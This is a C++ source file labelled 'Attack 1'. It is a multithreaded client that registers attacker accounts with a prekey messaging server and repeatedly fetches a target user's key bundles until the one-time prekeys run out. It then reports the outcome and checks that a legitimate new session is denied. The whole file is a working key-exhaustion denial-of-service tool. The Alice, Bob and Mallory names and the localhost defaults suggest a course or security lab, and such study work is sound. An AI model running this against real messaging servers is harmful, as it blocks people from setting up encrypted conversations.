#include <arpa/inet.h>
#include <netdb.h>
#include <sys/socket.h>
#include <unistd.h>

#include <algorithm>
#include <atomic>
#include <cerrno>
#include <charconv>
#include <cctype>
#include <cstring>
#include <iostream>
#include <mutex>
#include <optional>
#include <set>
#include <string>
#include <thread>
#include <vector>

namespace {

constexpr std::size_t kMaxFrameBytes = 1024 * 1024;

struct FetchResult {
    int request_number = 0;
    int worker = 0;
    std::string response_type;
    int opk_id = 0;
    int remaining = -1;
    std::string error;
};

bool valid_name(const std::string &value) {
    if (value.empty() || value.size() > 64) {
        return false;
    }
    for (unsigned char c : value) {
        if (!std::isalnum(c) && c != '_' && c != '-' && c != '.') {
            return false;
        }
    }
    return true;
}

std::optional<int> parse_positive_int(const char *text) {
    int value = 0;
    const char *end = text + std::strlen(text);
    const auto parsed = std::from_chars(text, end, value);
    if (parsed.ec != std::errc{} || parsed.ptr != end || value <= 0) {
        return std::nullopt;
    }
    return value;
}

int connect_tcp(const std::string &host, const std::string &port) {
    addrinfo hints{};
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    addrinfo *addresses = nullptr;
    const int lookup = getaddrinfo(host.c_str(), port.c_str(), &hints, &addresses);
    if (lookup != 0) {
        std::cerr << "Address lookup failed for " << host << ':' << port << ": "
                  << gai_strerror(lookup) << '\n';
        return -1;
    }

    int connected_socket = -1;
    for (addrinfo *address = addresses; address != nullptr; address = address->ai_next) {
        const int candidate = socket(address->ai_family, address->ai_socktype,
                                     address->ai_protocol);
        if (candidate < 0) {
            continue;
        }
        if (connect(candidate, address->ai_addr, address->ai_addrlen) == 0) {
            connected_socket = candidate;
            break;
        }
        close(candidate);
    }

    freeaddrinfo(addresses);
    return connected_socket;
}

bool send_all(int socket_fd, const std::string &line) {
    const std::string frame = line + '\n';
    std::size_t sent = 0;
    while (sent < frame.size()) {
        const ssize_t result = send(socket_fd, frame.data() + sent, frame.size() - sent,
                                    MSG_NOSIGNAL);
        if (result < 0 && errno == EINTR) {
            continue;
        }
        if (result <= 0) {
            return false;
        }
        sent += static_cast<std::size_t>(result);
    }
    return true;
}

bool receive_line(int socket_fd, std::string &line) {
    line.clear();
    char byte = 0;
    while (line.size() < kMaxFrameBytes) {
        const ssize_t result = recv(socket_fd, &byte, 1, 0);
        if (result < 0 && errno == EINTR) {
            continue;
        }
        if (result <= 0) {
            return false;
        }
        if (byte == '\n') {
            return true;
        }
        line.push_back(byte);
    }
    std::cerr << "Rejected an oversized server response\n";
    return false;
}

std::optional<std::string> json_string(const std::string &json, const std::string &key) {
    const std::string marker = "\"" + key + "\"";
    std::size_t position = json.find(marker);
    if (position == std::string::npos) {
        return std::nullopt;
    }
    position = json.find(':', position + marker.size());
    if (position == std::string::npos) {
        return std::nullopt;
    }
    position = json.find('"', position + 1);
    if (position == std::string::npos) {
        return std::nullopt;
    }
    const std::size_t end = json.find('"', position + 1);
    if (end == std::string::npos) {
        return std::nullopt;
    }
    return json.substr(position + 1, end - position - 1);
}

std::optional<int> json_int(const std::string &json, const std::string &key) {
    const std::string marker = "\"" + key + "\"";
    std::size_t position = json.find(marker);
    if (position == std::string::npos) {
        return std::nullopt;
    }
    position = json.find(':', position + marker.size());
    if (position == std::string::npos) {
        return std::nullopt;
    }
    ++position;
    while (position < json.size() && std::isspace(static_cast<unsigned char>(json[position]))) {
        ++position;
    }

    int value = 0;
    const char *begin = json.data() + position;
    const char *end = json.data() + json.size();
    const auto parsed = std::from_chars(begin, end, value);
    if (parsed.ec != std::errc{}) {
        return std::nullopt;
    }
    return value;
}

void worker(int worker_id, const std::string &host, const std::string &port,
            const std::string &target, const std::string &attacker_prefix,
            int max_fetches, std::atomic<int> &next_request, std::atomic<bool> &depleted,
            std::mutex &results_mutex, std::vector<FetchResult> &results) {
    const int socket_fd = connect_tcp(host, port);
    if (socket_fd < 0) {
        std::lock_guard<std::mutex> lock(results_mutex);
        results.push_back({0, worker_id, "connection_error", 0, -1,
                           "could not connect to the server"});
        depleted.store(true);
        return;
    }

    const std::string attacker = attacker_prefix + '_' + std::to_string(worker_id);
    const std::string register_request =
        "{\"type\":\"register\",\"user\":\"" + attacker + "\"}";
    std::string response;
    if (!send_all(socket_fd, register_request) || !receive_line(socket_fd, response) ||
        json_string(response, "type").value_or("") != "ok") {
        std::lock_guard<std::mutex> lock(results_mutex);
        results.push_back({0, worker_id, "registration_error", 0, -1, response});
        close(socket_fd);
        depleted.store(true);
        return;
    }

    while (!depleted.load()) {
        const int request_number = next_request.fetch_add(1);
        if (request_number > max_fetches) {
            break;
        }

        const std::string fetch_request =
            "{\"type\":\"fetch_bundle\",\"user\":\"" + target + "\"}";
        if (!send_all(socket_fd, fetch_request) || !receive_line(socket_fd, response)) {
            std::lock_guard<std::mutex> lock(results_mutex);
            results.push_back({request_number, worker_id, "transport_error", 0, -1,
                               "connection closed while fetching"});
            depleted.store(true);
            break;
        }

        FetchResult result;
        result.request_number = request_number;
        result.worker = worker_id;
        result.response_type = json_string(response, "type").value_or("unknown");
        result.opk_id = json_int(response, "opk_id").value_or(0);
        result.remaining = json_int(response, "count").value_or(-1);
        result.error = json_string(response, "err").value_or("");
        {
            std::lock_guard<std::mutex> lock(results_mutex);
            results.push_back(result);
        }

        if (result.response_type == "err") {
            depleted.store(true);
            break;
        }
    }

    close(socket_fd);
}

}  // namespace

int main(int argc, char *argv[]) {
    if (argc < 4 || argc > 7) {
        std::cerr << "Usage: " << argv[0]
                  << " <server-host> <server-port> <target-user>"
                     " [attacker-prefix] [max-fetches] [workers]\n"
                  << "Example: " << argv[0] << " 127.0.0.1 9000 bob mallory 100 1\n";
        return 2;
    }

    const std::string host = argv[1];
    const std::string port = argv[2];
    const std::string target = argv[3];
    const std::string attacker_prefix = argc >= 5 ? argv[4] : "mallory";
    const auto max_fetches = parse_positive_int(argc >= 6 ? argv[5] : "100");
    const auto workers = parse_positive_int(argc >= 7 ? argv[6] : "1");

    if (!valid_name(target) || !valid_name(attacker_prefix) || !max_fetches || !workers ||
        *workers > 64) {
        std::cerr << "Invalid arguments. Names may contain letters, digits, '.', '_' or '-'; "
                     "workers must be between 1 and 64.\n";
        return 2;
    }

    std::cout << "Attack 1: exhausting OPKs for target '" << target << "'\n"
              << "Server: " << host << ':' << port << ", workers: " << *workers
              << ", fetch limit: " << *max_fetches << "\n\n";

    std::atomic<int> next_request{1};
    std::atomic<bool> depleted{false};
    std::mutex results_mutex;
    std::vector<FetchResult> results;
    std::vector<std::thread> threads;

    for (int id = 0; id < *workers; ++id) {
        threads.emplace_back(worker, id, std::cref(host), std::cref(port),
                             std::cref(target), std::cref(attacker_prefix), *max_fetches,
                             std::ref(next_request), std::ref(depleted),
                             std::ref(results_mutex), std::ref(results));
    }
    for (auto &thread : threads) {
        thread.join();
    }

    std::sort(results.begin(), results.end(), [](const FetchResult &left, const FetchResult &right) {
        return left.request_number < right.request_number;
    });

    std::cout << "request,worker,type,opk_id,remaining,error\n";
    int bundles = 0;
    int refusals = 0;
    std::set<int> opk_ids;
    std::set<int> duplicate_ids;
    for (const FetchResult &result : results) {
        std::cout << result.request_number << ',' << result.worker << ',' << result.response_type
                  << ',' << result.opk_id << ',' << result.remaining << ',' << result.error << '\n';
        if (result.response_type == "bundle") {
            ++bundles;
            if (result.opk_id != 0 && !opk_ids.insert(result.opk_id).second) {
                duplicate_ids.insert(result.opk_id);
            }
        } else if (result.response_type == "err") {
            ++refusals;
        }
    }

    std::cout << "\nSummary\n"
              << "  Bundles allocated: " << bundles << '\n'
              << "  Unique non-zero OPK IDs: " << opk_ids.size() << '\n'
              << "  Empty-inventory refusals: " << refusals << '\n';
    if (!duplicate_ids.empty()) {
        std::cout << "  WARNING: duplicate OPK IDs observed:";
        for (int id : duplicate_ids) {
            std::cout << ' ' << id;
        }
        std::cout << '\n';
    }

    if (bundles == 0) {
        std::cerr << "No bundle was allocated. Ensure Bob published OPKs before running the attack.\n";
        return 1;
    }
    if (refusals == 0) {
        std::cerr << "The fetch limit was reached before an empty-inventory refusal was observed.\n";
        return 1;
    }

    std::cout << "OPK exhaustion demonstrated. Start Alice with fresh state and request Bob's "
                 "bundle to confirm that a legitimate new session is denied.\n";
    return 0;
}
